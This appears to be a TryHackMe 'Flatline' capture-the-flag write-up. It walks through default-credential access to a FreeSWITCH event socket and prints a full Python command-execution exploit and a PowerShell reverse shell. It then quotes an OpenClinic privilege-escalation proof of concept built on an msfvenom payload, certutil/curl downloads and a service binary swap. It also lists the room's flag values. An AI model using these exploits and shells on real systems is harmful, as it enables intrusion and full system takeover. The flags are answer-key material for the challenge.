## Flatline - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/flatline)

**IP: 10.10.180.46**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Windows Privilege Escalation <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan.

  ```
  $ nmap -Pn -p- 10.10.180.46

  PORT     STATE SERVICE
  3389/tcp open  ms-wbt-server
  8021/tcp open  ftp-proxy
  
  $ nmap -Pn -sC -sV -p 3389,8021 10.10.180.46
  
  PORT     STATE SERVICE          VERSION
  3389/tcp open  ms-wbt-server    Microsoft Terminal Services
  |_ssl-date: 2025-06-10T14:15:37+00:00; +6s from scanner time.
  | rdp-ntlm-info: 
  |   Target_Name: WIN-EOM4PK0578N
  |   NetBIOS_Domain_Name: WIN-EOM4PK0578N
  |   NetBIOS_Computer_Name: WIN-EOM4PK0578N
  |   DNS_Domain_Name: WIN-EOM4PK0578N
  |   DNS_Computer_Name: WIN-EOM4PK0578N
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-06-10T14:15:32+00:00
  | ssl-cert: Subject: commonName=WIN-EOM4PK0578N
  | Not valid before: 2025-06-09T13:54:52
  |_Not valid after:  2025-12-09T13:54:52
  8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  |_clock-skew: mean: 5s, deviation: 0s, median: 5s
  ```

- I tried connecting with FTP on 8021 but it wasnt successful.

  ```
  $ ftp 10.10.180.46 8021        
  Connected to 10.10.180.46.
  Content-Type: auth/request
  ftp> ls
  Not connected.
  ftp> pwd
  Not connected.
  ftp> exit
  ```
  
- When you visit that same port in the browser you'll get this:

  ```
  http://10.10.180.46:8021/ 

  Content-Type: auth/request
  
  
  Content-Type: command/reply
  Reply-Text: -ERR command not found
  ```

- Then I tried telnet.

  ```
  $ telnet 10.10.180.46 8021
  Trying 10.10.180.46...
  Connected to 10.10.180.46.
  Escape character is '^]'.
  Content-Type: auth/request
  
  Content-Type: text/disconnect-notice
  Content-Length: 67
  
  Disconnected, goodbye.
  See you at ClueCon! http://www.cluecon.com/
  Connection closed by foreign host.
  ```

- So here I googled ClueCon and fuond default credentials [here](http://lists.freeswitch.org/pipermail/freeswitch-users/2009-January/038381.html).

  ```
  $ telnet 10.10.180.46 8021
  Trying 10.10.180.46...
  Connected to 10.10.180.46.
  Escape character is '^]'.
  Content-Type: auth/request
  
  auth ClueCon
  
  Content-Type: command/reply
  Reply-Text: +OK accepted
  
  ls
  
  Content-Type: command/reply
  Reply-Text: -ERR command not found
  
  dir
  
  Content-Type: command/reply
  Reply-Text: -ERR command not found
  
  exit
  
  Content-Type: command/reply
  Reply-Text: +OK bye
  
  Content-Type: text/disconnect-notice
  Content-Length: 67
  
  Disconnected, goodbye.
  See you at ClueCon! http://www.cluecon.com/
  Connection closed by foreign host.
  ```

- Since I couldn't execute any command, I started looking for some exploits and found command execution.

  ```
  $ searchsploit freeswitch   
  --------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                   |  Path
  --------------------------------------------------------------------------------- ---------------------------------
  FreeSWITCH - Event Socket Command Execution (Metasploit)                         | multiple/remote/47698.rb
  FreeSWITCH 1.10.1 - Command Execution                                            | windows/remote/47799.txt
  --------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  ```

---

## ⚙️ Shell Access

- For a reverse shell I used this exploit which is `47799`.

  ```
  #!/usr/bin/python3

  from socket import *
  import sys
  
  if len(sys.argv) != 3:
      print('Missing arguments')
      print('Usage: freeswitch-exploit.py <target> <cmd>')
      sys.exit(1)
  
  ADDRESS=sys.argv[1]
  CMD=sys.argv[2]
  PASSWORD='ClueCon' # default password for FreeSWITCH
  
  s=socket(AF_INET, SOCK_STREAM)
  s.connect((ADDRESS, 8021))
  
  response = s.recv(1024)
  if b'auth/request' in response:
      s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
      response = s.recv(1024)
      if b'+OK accepted' in response:
          print('Authenticated')
          s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
          response = s.recv(8096).decode()
          print(response)
      else:
          print('Authentication failed')
          sys.exit(1)
  else:
      print('Not prompted for authentication, likely not vulnerable')
      sys.exit(1) 
  ```

- You simply run the exploit with arguments `IP` and `command`.

  ```
  $ python3 exploit.py 10.10.180.46 whoami
  Authenticated
  Content-Type: api/response
  Content-Length: 25
  
  win-eom4pk0578n\nekrotic
  
  $ python3 exploit.py 10.10.180.46 dir
  Authenticated
  Content-Type: api/response
  Content-Length: 2346
  
   Volume in drive C has no label.
   Volume Serial Number is 84FD-2CC9
  
   Directory of C:\Program Files\FreeSWITCH
  
  09/11/2021  08:38    <DIR>          .
  09/11/2021  08:38    <DIR>          ..
  09/11/2021  08:22    <DIR>          cert
  09/11/2021  08:22    <DIR>          conf
  10/06/2025  14:56    <DIR>          db
  09/11/2021  08:18    <DIR>          fonts
  20/08/2019  13:08         4,991,488 FreeSwitch.dll
  20/08/2019  13:08            26,624 FreeSwitchConsole.exe
  20/08/2019  13:19            62,976 fs_cli.exe
  09/11/2021  08:18    <DIR>          grammar
  09/11/2021  08:18    <DIR>          htdocs
  09/11/2021  08:18    <DIR>          images
  13/05/2019  07:13           293,888 ks.dll
  20/08/2019  13:04           152,064 libapr.dll
  20/08/2019  13:04           134,656 libaprutil.dll
  20/08/2019  13:16           131,584 libbroadvoice.dll
  21/03/2018  21:39         1,805,824 libeay32.dll
  23/03/2019  17:37         1,050,112 libmariadb.dll
  09/11/2021  08:18    <DIR>          libmariadb_plugin
  20/08/2019  13:06           190,464 libpng16.dll
  05/04/2018  10:18           279,552 libpq.dll
  04/04/2018  18:59         1,288,192 libsndfile-1.dll
  20/08/2019  13:05         1,291,776 libspandsp.dll
  20/08/2019  13:04            27,648 libteletone.dll
  10/06/2025  14:55    <DIR>          log
  09/08/2018  12:42           283,648 lua53.dll
  09/11/2021  08:18    <DIR>          mod
  09/04/2018  13:36        66,362,368 opencv_world341.dll
  09/11/2021  08:18           825,160 openh264.dll
  20/08/2019  13:02             4,596 OPENH264_BINARY_LICENSE.txt
  03/04/2018  18:31           147,456 pcre.dll
  20/08/2019  13:14           313,856 pocketsphinx.dll
  20/08/2019  13:10            49,152 pthread.dll
  09/11/2021  08:22    <DIR>          recordings
  09/11/2021  08:22    <DIR>          run
  09/11/2021  08:22    <DIR>          scripts
  13/05/2019  08:03           165,888 signalwire_client.dll
  09/11/2021  08:18    <DIR>          sounds
  20/08/2019  13:14           366,592 sphinxbase.dll
  21/03/2018  21:39           349,184 ssleay32.dll
  09/11/2021  08:22    <DIR>          storage
  24/03/2018  21:20        15,766,528 v8.dll
  24/03/2018  21:05           177,152 v8_libbase.dll
  24/03/2018  21:19           134,656 v8_libplatform.dll
  03/04/2018  15:01           126,976 zlib.dll
                28 File(s)     96,800,060 bytes
                17 Dir(s)  50,087,198,720 bytes free
  ```

- Perfect, exploit worked! Reverse shell time, I did powershell reverse shell here.

  ```
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR-THM-IP]',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
  {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

- Save it as `shell.ps1` and run the exploit. You will get a connection on your listener.

  ```
  $ python3 exploit.py 10.10.180.46 "$(cat shell.ps1)"
  Authenticated
  
  $ nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.180.46] 49910
  whoami
  win-eom4pk0578n\nekrotic
  ```

---

## 🧍 User Privilege Escalation

- Both flags are on Desktop but you cant read the root flag.

  ```
  PS C:\Users\Nekrotic> cd Desktop
  PS C:\Users\Nekrotic\Desktop> dir
  
  
      Directory: C:\Users\Nekrotic\Desktop
  
  
  Mode                LastWriteTime         Length Name                                                                  
  ----                -------------         ------ ----                                                                  
  -a----       09/11/2021     07:39             38 root.txt                                                              
  -a----       09/11/2021     07:39             38 user.txt                                                              
  
  
  PS C:\Users\Nekrotic\Desktop> Get-Content root.txt
  
  PS C:\Users\Nekrotic\Desktop> Get-Content user.txt
  THM{64bca0843d535fa73eecdc59d27cbe26}
  ```

- Moving to root escalation now.

---

## 👑 Root Privilege Escalation

- After enumerating for a bit I found my way to root.

  ```
  PS C:\> cd projects
  PS C:\projects> dir
  
  
      Directory: C:\projects
  
  
  Mode                LastWriteTime         Length Name                                                                  
  ----                -------------         ------ ----                                                                  
  d-----       09/11/2021     07:29                openclinic 
  ```

- Now I looked for `openclinic` exploits and found this bad boi:

  ```
  $ searchsploit openclinic   
  --------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                   |  Path
  --------------------------------------------------------------------------------- ---------------------------------
  OpenClinic GA 5.194.18 - Local Privilege Escalation                              | windows/local/50448.txt
  OpenClinic GA 5.247.01 - Information Disclosure                                  | php/webapps/51994.md
  OpenClinic GA 5.247.01 - Path Traversal (Authenticated)                          | php/webapps/51995.md
  --------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  
  $cat 50448.txt
  
                                  # Proof of Concept
  
  1. Generate malicious .exe on attacking machine
      msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe
  
  2. Setup listener and ensure apache is running on attacking machine
      nc -lvp 4242
      service apache2 start
  
  3. Download malicious .exe on victim machine
      type on cmd: curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
  
  4. Overwrite file and copy malicious .exe.
      Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak
      Rename downloaded 'mysqld_evil.exe' file in mysqld.exe
  
  5. Restart victim machine
  
  6. Reverse Shell on attacking machine opens
      C:\Windows\system32>whoami
      whoami
      nt authority\system
  ```

- Now, just follow the guide and you'll get a shell as admin at the end. First create a shell with msfvenom and start both Python server and a listener.

  ```
  $ msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR-THM-IP] LPORT=5555 -f exe > mysqld_evil.exe
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x86 from the payload
  No encoder specified, outputting raw payload
  Payload size: 324 bytes
  Final size of exe file: 73802 bytes
  ```

- Now, on target machine rename the `mysqld.exe` file to `mysqld.bak` and download our shell. I used `certutil` but `curl` will work as well.

  ```
  PS C:\projects\openclinic> cd C:\projects\openclinic\mariadb\bin

  PS C:\projects\openclinic\mariadb\bin> Move-Item mysqld.exe mysqld.bak
  
  PS C:\projects\openclinic\mariadb\bin> certutil.exe -urlcache -split -f http://[YOUR-THM-IP]:80/mysqld_evil.exe mysqld.exe
  ****  Online  ****
    000000  ...
    01204a
  CertUtil: -URLCache command completed successfully.
  
  $ python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.180.46 - - [10/Jun/2025 15:53:51] "GET /mysqld_evil.exe HTTP/1.1" 200 -
  10.10.180.46 - - [10/Jun/2025 15:53:52] "GET /mysqld_evil.exe HTTP/1.1" 200 -
  ```

- Lastly, restart the target machine and wait a bit for a machine to reboot and you'll get a connection as admin.

  ```
  PS C:\projects\openclinic\mariadb\bin> Restart-Computer
  
  $ nc -lvnp 5555                             
  listening on [any] 5555 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.180.46] 49671
  Microsoft Windows [Version 10.0.17763.737]
  (c) 2018 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami
  nt authority\system
  ```

- You already know where the root flag is, just go and read it and say I AM ROOOOOOOOOOOOOOOOOOOOOOOOOT!

---

## 🏁 Flags

- **User Flag**: `THM{64bca0843d535fa73eecdc59d27cbe26}`
- **Root Flag**: `THM{8c8bc5558f0f3f8060d00ca231a9fb5e}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way around Freeswitch.`

- What did I learn?
  `New reverse shell and new privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
